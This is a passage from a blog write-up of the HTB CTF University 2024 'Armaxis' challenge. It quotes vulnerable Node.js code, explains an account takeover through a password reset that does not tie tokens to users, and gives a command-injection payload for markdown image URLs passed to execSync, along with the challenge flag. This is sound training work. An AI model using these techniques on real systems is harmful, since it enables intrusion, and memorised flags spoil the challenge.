obtain File Read or Code Execution within the application.\n1 COPY flag.txt /flag.txt After reading the source code, i found that parseMarkdown are using execSync with unsafe usage. This will allow us to obtain code execution if we manage to control the url value.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function parseMarkdown(content) { if (!content) return \u0026#39;\u0026#39;; return md.render( content.replace(/\\!\\[.*?\\]\\((.*?)\\)/g, (match, url) =\u0026gt; { try { const fileContent = execSync(`curl -s ${url}`); const base64Content = Buffer.from(fileContent).toString(\u0026#39;base64\u0026#39;); return `\u0026lt;img src=\u0026#34;data:image/*;base64,${base64Content}\u0026#34; alt=\u0026#34;Embedded Image\u0026#34;\u0026gt;`; } catch (err) { console.error(`Error fetching image from URL ${url}:`, err.message); return `\u0026lt;p\u0026gt;Error loading image: ${url}\u0026lt;/p\u0026gt;`; } }) ); } url value are obtain using regex, which will search for markdown image format such as:\n1 ![test](http://yooursite.com) this way, we can inject payload below to obtain code execution\n1 ![test](http://yooursite.com;id) parseMarkdown function was called within /weapons/dispath routes and only accessible for user with admin privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 router.post(\u0026#34;/weapons/dispatch\u0026#34;, authenticate, async (req, res) =\u0026gt; { const { role } = req.user; if (role !== \u0026#34;admin\u0026#34;) return res.status(403).send(\u0026#34;Access denied.\u0026#34;); const { name, price, note, dispatched_to } = req.body; if (!name || !price || !note || !dispatched_to) { return res.status(400).send(\u0026#34;All fields are required.\u0026#34;); } try { const parsedNote = parseMarkdown(note); await dispatchWeapon(name, price, parsedNote, dispatched_to); res.send(\u0026#34;Weapon dispatched successfully.\u0026#34;); } catch (err) { console.error(\u0026#34;Error dispatching weapon:\u0026#34;, err); res.status(500).send(\u0026#34;Error dispatching weapon.\u0026#34;); } }); admin users were defined within database initialization below\n1 2 3 4 5 await runInsertUser( \u0026#34;admin@armaxis.htb\u0026#34;, `${crypto.randomBytes(69).toString(\u0026#34;hex\u0026#34;)}`, \u0026#34;admin\u0026#34;, ); To obtain admin credentials, we can perform an account takeover through the reset password feature. This feature allows users to reset their password using a token sent to their email. However, there is no validation to ensure that the token is assigned to the correct user. Additionally, we can supply any email address during the password reset process.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 router.post(\u0026#34;/reset-password/request\u0026#34;, async (req, res) =\u0026gt; { const { email } = req.body; if (!email) return res.status(400).send(\u0026#34;Email is required.\u0026#34;); try { const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); const resetToken = crypto.randomBytes(16).toString(\u0026#34;hex\u0026#34;); const expiresAt = Date.now() + 3600000; await createPasswordReset(user.id, resetToken, expiresAt); await transporter.sendMail({ from: \u0026#34;noreply@frontier.com\u0026#34;, to: email, subject: \u0026#34;Password Reset\u0026#34;, text: `Use this token to reset your password: ${resetToken}`, }); res.send(\u0026#34;Password reset token sent to your email.\u0026#34;); } catch (err) { console.error(\u0026#34;Error processing reset request:\u0026#34;, err); res.status(500).send(\u0026#34;Error processing reset request.\u0026#34;); } }); router.post(\u0026#34;/reset-password\u0026#34;, async (req, res) =\u0026gt; { const { token, newPassword, email } = req.body; // Added \u0026#39;email\u0026#39; parameter if (!token || !newPassword || !email) return res.status(400).send(\u0026#34;Token, email, and new password are required.\u0026#34;); try { const reset = await getPasswordReset(token); if (!reset) return res.status(400).send(\u0026#34;Invalid or expired token.\u0026#34;); const user = await getUserByEmail(email); if (!user) return res.status(404).send(\u0026#34;User not found.\u0026#34;); await updateUserPassword(user.id, newPassword); await deletePasswordReset(token); res.send(\u0026#34;Password reset successful.\u0026#34;); } catch (err) { console.error(\u0026#34;Error resetting password:\u0026#34;, err); res.status(500).send(\u0026#34;Error resetting password.\u0026#34;); } }); 1 2 3 4 5 6 7 8 9 async function getPasswordReset(token) { const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at \u0026gt; ?`; try { const reset = await get(query, [token, Date.now()]); return reset; } catch (error) { throw error; } } Exploitation In order to takeover admin account, we need to:\nregister using test@email.htb perform reset password action obtain reset password token change email address upon form submission from test@email.htb into admin account admin@armaxis.htb now we can logged in into admin account the next step is to exploit code injection within dispatch weapon feature which will reflect in home page base64-decode the value will show the command output the last step is to read the flag in /flag.txt Flag : HTB{l00k0ut_f0r_m4rkd0wn_LF1_1n_w1ld!_ed3f0dc157df0cc33fc59f2854b4d9ee}\n","date":"2024-12-18T08:04:09.436Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-armaxis/","title":"[HTB CTF University 2024] - Armaxis"}]